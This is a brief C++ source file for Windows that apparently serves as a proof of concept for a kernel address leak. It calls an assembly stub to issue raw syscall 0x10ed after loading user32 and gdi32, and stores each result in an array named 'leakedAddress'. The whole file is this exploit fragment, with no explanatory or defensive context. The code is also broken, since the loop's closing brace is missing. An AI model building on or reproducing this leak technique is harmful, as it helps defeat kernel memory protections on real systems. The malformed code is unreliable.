#include <stdio.h>
#include <Windows.h>
#include <stdlib.h>

extern "C" {
	UINT64 syscallNumber;
	UINT64 syscallArgv[8];
	UINT64 syscallRet;
	UINT8 fakeStack[1024 * 1024];
	void  asmSyscall(void);
}

int main()
{
	LoadLibraryA("user32.dll");
	LoadLibraryA("gdi32.dll");
	INT64 leakedAddress[30] = { 0, };
	syscallArgv[0] = 0x0;
	INT64 i = 0;
	for (i = 0; i <= 1; i++)
	{
		syscallNumber = 0x10ed;
		asmSyscall();
		leakedAddress[i] = syscallRet;
	
	return 0;
}	